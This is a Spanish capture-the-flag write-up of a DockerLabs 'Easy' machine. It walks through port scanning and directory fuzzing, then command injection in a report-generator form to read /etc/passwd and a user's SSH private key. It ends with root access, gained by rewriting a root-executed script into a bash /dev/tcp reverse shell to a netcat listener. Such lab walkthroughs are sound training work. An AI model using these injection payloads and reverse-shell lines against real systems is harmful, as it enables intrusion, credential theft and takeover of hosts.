Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #command-injection #ssh #dockerlabs
 

![](../assets/Pasted image 20251108192308.png)


## Reconocimiento

Comenzamos comprobando la conectividad:
```bash
> ping -c 1 172.17.0.2

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.164/0.164/0.164/0.000 ms
```

Tiramos un escaneo con nmap para ver que puertos están abiertos:
```bash
> sudo nmap -p- --open -sS --min-rate 5000 -Pn -n 172.17.0.2
--------------------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
- Puerto 80 y 22 Abiertos

Tiramos un segundo escaneo para ver los servicios y versiones que estén corriendo.
```bash
> nmap -p 22,80 -Pn -n --min-rate 5000 -sCV -sS 172.17.0.2 -oN target.txt
-------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Generador de Reportes - Centro de Operaciones
MAC Address: AA:58:E1:5F:A8:6B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
- En el puerto 80 corre un Apache httpd 2.4.58 ((Ubuntu)) y en el 22 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
## Enumeración

**Puerto 80**
Al parecer existe un generador de reportes, el cual nos permite crear un reporte con nombre/fecha y nos regresa la path donde se guardo y el contenido indicado:
![](../assets/Pasted image 20251108194014.png)

También existe otra tab donde al parecer puedo subir archivos
![](../assets/Pasted image 20251108194043.png)


Procedo a realizar fuzzing para tener un poco mas claro los recursos del servidor
```bash
> gobuster dir -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://172.17.0.2/ -x html,php,py,js,txt
----------------------------------------------------------------------------------------------------------------------------------------------------------
/scripts.js           (Status: 200) [Size: 1090]
/upload.html          (Status: 200) [Size: 2314]
/upload.js            (Status: 200) [Size: 1645]
/upload.php           (Status: 200) [Size: 33]
/old                  (Status: 301) [Size: 306] [--> http://172.17.0.2/old/]
/index.php            (Status: 200) [Size: 2953]
/server-status        (Status: 403) [Size: 275]
/reportes             (Status: 301) [Size: 311] [--> http://172.17.0.2/reportes/]
```
- _scripts.js_ solo es un script para la animación de la progress-bar
- _upload.html_ e _index.php_ son las tabs principales de la pagina
- _upload.php_ es el script que utiliza la tab _upload.html_ para subir los archivos al servidor
- _old/_ es una versión vieja de la aplicación, no es nada interesante
- _reportes/_ es donde se guardan los reportes generados


## Explotación

Mi primer approach fue intentar subir una reverse shell en la tab de _upload_ 
- Al parecer el archivo se sube correctamente pero no existe ningún directorio al cual yo pueda acceder para ejecutar el archivo
![](../assets/Pasted image 20251108201528.png)

Entonces lo segundo fue tratar de volcar archivos mediante inyección de comandos en la tab de generador de reportes:
![](../assets/Pasted image 20251108202027.png)

El resultado fue que el servidor no me interpreta el comando:
![](../assets/Pasted image 20251108202037.png)
- Mi suposición era que internamente el servidor hacia algo como esto: 
```bash
   echo 'Nombre: cat /etc/passwd' > archivo.txt
```

Entonces ahora lo que intente fue usar las `;` para ver si el servidor me interpretaba de manera secuencial los comandos:

![](../assets/Pasted image 20251108202319.png)

- Internamente lo que se supone que debería de suceder es algo asi:  las _;_ encadenan comandos, es decir se debería de volcar el output de mi comando /etc/passwd
```bash
> echo 'Nombre: ; cat /etc/passwd' > archivo.txt
```

Y efectivamente el servidor me interpreto el comando y me volcó el contenido.
- aquí nos damos cuenta que existe otro usuario llamado _samara_

![](../assets/Pasted image 20251108202403.png)

Ahora sabiendo que existe el usuario _samara_ y que el servidor me esta interpretando los comandos, se me ocurren varias cosas
- Tratar de entablarme una reverse shell
- Fuerza bruta con hydra al usuario samara
- Tratar de apuntar a la clave ssh de samara

Lo que hice fue apuntar a la clave ssh de samara, ya que si me entablaba una reverse_shell iba a entrar como el usuario _www-data_ y existía la posibilidad de que igualmente tuviera que migrar a _samara.

![](../assets/Pasted image 20251108202905.png)

Y la clave ssh fue volcada correctamente
![](../assets/Pasted image 20251108202949.png)

Procedo a bajar la clave en mi sistema y conectarme por ssh

```bash
> chmod 600 key
> ssh -i key samara@172.17.0.2
---------------------------------
samara@ad7c505509df:~$ whoami
samara
```
## Escalada de Privilegios

Dentro del sistema lo primero que hago es ver que contenido existe en mi actual directorio
```bash
samara@ad7c505509df:~$ ls
message.txt  user.txt
samara@ad7c505509df:~$ cat message.txt 
No tienes permitido estar aqui :(.
samara@ad7c505509df:~$ cat user.txt
030208509edea7480a10b84baca3df3e
```
- el archivo _user.txt_ al parecer es un hash de 32 caracteres por lo cual supongo que es un _MD5_  

Probé romper este hash con john y con hashcat sin ningún resultado:
```bash
> sudo john --format=raw-md5 hash.txt
> hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Entonces ahora me decidí por buscar posibles proceso que el usuario root este ejecutando
```bash
> ps aux | grep root
-----------------------------------------------------------------------------------------------------------------------------------------------------------------
root  1  5.1  0.0   2800  1748 ? Ss 02:32   3:23 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
```
- Encontramos este proceso que básicamente es un loop infinito que ejecuta a un script llamado _echo.sh_

Entonces podemos tratar de modificar el script para establecernos una reverse_shell ya que eventualmente el usuario root va a ejecutar el script malicioso.
- Primero nos ponemos en escucha:
```bash
> sudo nc -nlvp 443
```
- Modificamos el script
```bash
> nano /usr/local/bin/echo.sh
samara@ad7c505509df:~$ cat /usr/local/bin/echo.sh
#!/bin/bash

bash -i >& /dev/tcp/172.17.0.1/443 0>&1
```

El usuario root ejecuta el script y tenemos acceso como root
```bash
> Connection received on 172.17.0.2 57956
root@ad7c505509df:/# whoami
whoami
root
root@ad7c505509df:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

***PWNED**
